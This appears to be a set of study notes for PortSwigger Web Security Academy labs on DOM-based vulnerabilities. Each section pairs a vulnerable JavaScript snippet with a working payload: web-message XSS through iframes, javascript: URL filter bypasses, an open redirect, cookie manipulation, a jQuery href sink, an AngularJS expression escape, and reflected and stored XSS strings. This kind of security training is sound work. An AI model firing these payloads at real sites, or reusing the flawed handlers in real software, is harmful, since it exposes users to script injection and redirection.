# DOM-based Vulnerability

### DOM XSS using web messages
* Vulnerable Code - `addEventListener()` listens for a web message
```html
<!-- Ads to be inserted here -->
<div id='ads'>
</div>
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```
* Payload - By adding a wrong `src` and `onerror=` function will cause `print()`
```html
<iframe src="https://ac7e1f1c1f3ed2d1c06281a0005800be.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### DOM XSS using web messages and a JavaScript URL
* Vulnerable Code - `indexOf` looks for http: or https: in the message body
```html
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```
* Payload
```html
<iframe src="https://acf31f5e1e1ff65ec0851f1800fc00fa.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
```

### DOM XSS using web messages and JSON.parse
* Vulnerable Code - `JSON.parse` parse the message data.
```html
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```
* Payload
```html
<iframe src="https://acbe1f971f2cee6bc0482be200600037.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

### DOM-based open redirection
* Vulnerable Code
```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```
* Payload
```html
### Visit the following URL. The vulnerable code will read the value of url= and redirect the user to the following url when "Back to Blog" is clicked:

https://acaa1f4e1f5e9aa7c0c6e265002f004c.web-security-academy.net/post?postId=4&url=https://exploit-ac4f1f6d1f429a0dc0e4e2eb018e0096.web-security-academy.net/ 
```

### DOM-based cookie manipulation
* Payload
```html
<iframe src="https://acb61f151e1962a8c0e21111007b00ff.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://acb61f151e1962a8c0e21111007b00ffweb-security-academy.net';window.x=1;"> 
```

### DOM XSS in jQuery anchor href attribute sink using location.search source
* Vulnerable Code - We can inject JavaScript with `returnPath` parameter, and it will be added as a value to `attr()` attrobite. 
```html
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>
```
* Payload
```html
https://acae1faa1ef8845fc0303f5900250072.web-security-academy.net/feedback?returnPath=javascript:alert(document.domain)
```

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded. 

`<body ng-app>` --> This indicates that it uses AngularJS ng-app directive. Using double-curly braces, you can introduce an arbitrary JavaScript.

* Payload
```
{{$on.constructor('alert(1)')()}}
```

### Reflected DOM XSS
Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

* Payload
```
\"-alert(1)}//
```

Server response:
```json
{"results":[],"searchTerm":"\\"-alert(1)}//"}
```

### Stored DOM XSS
* Payload
```
 <><img src=1 onerror=alert(1)> 
```
